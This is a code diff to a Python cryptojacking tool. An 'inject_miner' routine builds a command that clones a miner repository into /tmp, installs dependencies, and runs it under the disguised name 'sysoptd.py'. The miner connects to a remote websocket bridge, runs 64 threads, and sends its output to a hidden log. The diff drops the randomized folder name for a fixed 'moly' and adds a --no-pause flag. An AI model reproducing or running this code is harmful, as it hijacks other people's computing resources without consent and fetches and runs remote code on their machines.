@@ -15,18 +15,13 @@ BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"
 
 
 def generate_random_folder_name() -> str:
-    """Generate randomized folder name: opt-a3f7b2c1"""
-    hex_suffix = subprocess.run(
-        ["openssl", "rand", "-hex", "4"],
-        capture_output=True,
-        text=True
-    ).stdout.strip()
-    return f"opt-{hex_suffix}"
+    """Generate folder name: moly (fixed)"""
+    return "moly"
 
 
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
-    """Build worker start command with randomized folder."""
-    return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-schedule > /tmp/m.log 2>&1"""
+    """Build worker start command."""
+    return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-schedule  --no-pause > /tmp/m.log 2>&1"""
 
 
 async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
